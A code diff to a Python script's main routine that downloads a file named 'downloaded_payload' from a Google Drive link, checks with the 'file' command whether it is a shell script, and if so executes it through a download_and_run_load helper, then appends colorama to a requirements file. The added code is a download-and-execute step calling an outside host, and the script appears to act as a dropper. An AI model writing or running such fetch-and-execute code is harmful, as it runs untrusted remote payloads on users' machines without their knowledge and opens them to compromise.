@@ -22,12 +22,27 @@ def main():
 
     drive_url = 'https://drive.google.com/uc?export=download&id=1zxiOgCSSYsXTidmmmPqBxI0GTeEPUu1y'
 
-    print('Attempting to download and run payload from Google Drive...')
+    print('Attempting to download payload from Google Drive...')
     try:
-        ran = installer.download_and_run_load(drive_url, str(base / 'downloaded_payload'))
-        print('download_and_run_load returned', ran)
+        downloaded = installer.download_via_gdown(drive_url, str(base / 'downloaded_payload'))
+        print('downloaded ->', downloaded)
+        if downloaded:
+            rc, out, err = installer.run_and_capture(f'file -b "{downloaded}"')
+            desc = (out or err or '').strip()
+            print('file description:', desc)
+            if 'shell script' in desc.lower() or 'bash script' in desc.lower() or 'posix shell' in desc.lower():
+                print('Detected shell script — executing...')
+                try:
+                    ran = installer.download_and_run_load(drive_url, str(base / 'downloaded_payload'))
+                    print('execution result:', ran)
+                except Exception as exc:
+                    print('execution failed:', exc)
+            else:
+                print('Not a shell script; skipping execution')
+        else:
+            print('download failed')
     except Exception as exc:
-        print('download_and_run_load failed:', exc)
+        print('download step failed:', exc)
 
     print('Appending pip package colorama==0.4.6 to', req)
     try:
